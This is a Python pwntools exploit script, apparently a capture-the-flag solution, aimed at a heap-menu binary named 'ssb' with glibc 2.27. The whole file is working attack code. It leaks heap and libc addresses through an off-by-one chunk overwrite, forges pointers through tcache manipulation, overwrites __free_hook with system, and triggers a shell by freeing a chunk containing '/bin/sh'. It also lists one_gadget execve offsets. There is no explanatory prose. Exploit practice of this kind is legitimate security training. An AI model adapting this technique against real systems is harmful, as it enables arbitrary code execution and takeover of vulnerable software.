from pwn import *
from pwn_debug.pwn_debug import *
# context.log_level = 'debug'

TARGET = './ssb'
HOST = ''
PORT = 0 
env = {"LD_PRELOAD": "libc-2.27.so"}

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

pdbg = pwn_debug(TARGET)
pdbg.local("libc-2.27.so")
r = pdbg.run("local")
pdbg.bp([0x10e6, 0x153c, 0x116b], 'parent', 'c')



# r = process(TARGET)
# r = remote(HOST, PORT)

elf = ELF(TARGET)

def show_dir(): 
    payload = ''
    payload += '1'
    r.sendline(payload)
    return r.recvuntil('>')

def add_file(name, size, data): 
    payload = ''
    payload += '2'
    r.sendline(payload)

    r.recvuntil('name:')
    payload = ''
    payload += name
    r.sendline(payload)

    r.recvuntil('size:')
    payload = ''
    payload += str(size)
    r.sendline(payload)

   # sleep(0.1)
    payload = ''
    payload += data
    r.sendline(payload)

    r.recvuntil('>')

def add_dir(name): 
    payload = ''
    payload += '3'
    r.sendline(payload)

    r.recvuntil('name:')
    payload = ''
    payload += name
    r.sendline(payload)

    r.recvuntil('>')

def show_file(name):
    payload = ''
    payload += '4'
    r.sendline(payload)

    r.recvuntil('name:')
    payload = ''
    payload += name
    r.sendline(payload)
    return r.recvuntil('>')

def cd(name):
    payload = ''
    payload += '5'
    r.sendline(payload)

    r.recvuntil('name:')
    payload = ''
    payload += name
    r.sendline(payload)
    r.recvuntil('>')

def remove_file(name):
    payload = ''
    payload += '6'
    r.sendline(payload)

    r.recvuntil('name:')
    payload = ''
    payload += name
    r.sendline(payload)
    r.recvuntil('>')

def build_addr(offset, target):
    cnt = 0
    inserted = []
    while(cnt < 6):
        value = (target >> (cnt*8)) & 0xff
        for i in inserted:
            if i < value:
                value = value - 1
            if i == value:
                assert "BAD LUCK: has same value"
        inserted.append(value)
        flag = 0
        # pause()
        for i in range(offset, 0x55):
            if i == value:
                cd('3')
                add_file(str(i), 0x4, str(i)) 
                flag = 1
                cd('..')
                for j in range(offset, i):
                    remove_file(str(j))
                cnt += 1
                break
            else:
                add_file(str(i), 0x4, str(i)) 
     
        if flag == 1:
            continue
         
        cd('4')
        for i in range(0x55, 0xaa):
            if i == value:
                cd('..')
                cd('3')
                add_file(str(i), 0x4, str(i)) 
                flag = 1
                cd('..') 
                cd('4')
                for j in range(0x55, i):
                    remove_file(str(j))
                cd('..') 
                for j in range(offset, 0x55):
                    remove_file(str(j))
                cnt += 1
                break
            else:
                add_file(str(i), 0x4, str(i))
          
        if flag == 1:
            continue
      
        cd('..')
        cd('5')
        for i in range(0xaa, 0xff):
            if i == value:
                cd('..')
                cd('3')
                add_file(str(i), 0x4, str(i)) 
                flag = 1
                cd('..') 
                cd('5')
                for j in range(0xaa, i):
                    remove_file(str(j))
                cd('..') 
                cd('4')
                for j in range(0x55, 0xaa):
                    remove_file(str(j))
                cd('..') 
     
                for j in range(offset, 0x55):
                    remove_file(str(j))
                cnt += 1
                break
            else:
                add_file(str(i), 0x4, str(i))
     
r.recvuntil('>') 

for i in range(8):
    add_file(str(i), 0x80, str(i))

for i in range(8):
    remove_file(str(7-i))

add_file('1', 0x50, '1')
add_file('2', 0x51, '2')
add_dir('3')
add_dir('4')
for i in range(5, 0x55):
    add_file(str(i), 0x4, str(i))
cd('3')
for i in range(0x55, 0xaa):
    add_file(str(i), 0x4, str(i))
cd('..')
cd('4')
for i in range(0xaa, 0xff):
    add_file(str(i), 0x4, str(i))

cd('..')
remove_file('1')
add_file('1', 0x50, '1'*0x50 + '\x01' + '2')
cd('2')
leak = show_dir().split('\n')

heap_leak = 0 
for i in range(6):
    heap_leak += int(leak[i+1]) << (i*8)

dbg('heap_leak')
heap_base = heap_leak - 0x280
dbg('heap_base')

target = heap_base + 0x2e0
dbg("target")

cd('..')
for i in range(5, 0x55):
    remove_file(str(i))
cd('3')
for i in range(0x55, 0xaa):
    remove_file(str(i))
cd('..')
cd('4')
for i in range(0xaa, 0xff):
    remove_file(str(i))

# root and '4': temp
# '3': will be target addr

cd('..') 
add_dir('5')
remove_file('1')
cd('3')
add_file('1', 2, '1')
cd('..')

build_addr(6, target)

remove_file('2')
add_file('2', 0x50, '1'*0x50 + '\x02' + '3')

libc_leak = u64(show_file('3').split('\n')[0][1:].ljust(8, '\x00'))
libc_base = libc_leak - 0x3ebca0
dbg("libc_leak")
dbg("libc_base")

malloc_hook = libc_base + 0x3ebc30
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f440

gadget = [ 
0x4f2c5, # execve("/bin/sh", rsp+0x40, environ) 
0x4f322, # execve("/bin/sh", rsp+0x40, environ) 
0x10a38c # execve("/bin/sh", rsp+0x70, environ)
]

remove_file('2')
add_file('2', 0x50, '1'*0x50 + '\x01' + '3')
cd('3')
for i in range(6, 0x100):
    remove_file(str(i))
cd('..')
add_file('6', 0x70, '6') # for dup
add_file('7', 0x70, '7') # has target addr heap+0x780

target = heap_base + 0x780 # file '3' has target
dbg("target")

build_addr(8, target)

remove_file('2')
add_file('2', 0x50, '1'*0x50 + '\x02' + '3')
remove_file('3')
remove_file('6')
remove_file('7')
add_file('A', 0x70, p64(free_hook))
add_file('B', 0x70, p64(0xdeadbeef))
add_file('C', 0x70, '/bin/sh')
# one_gadget = libc_base + gadget[1]
# dbg("one_gadget")
add_file('shell', 0x70, p64(system))

r.sendline('6')
r.sendlineafter('name:', 'C')

r.interactive()
r.close()
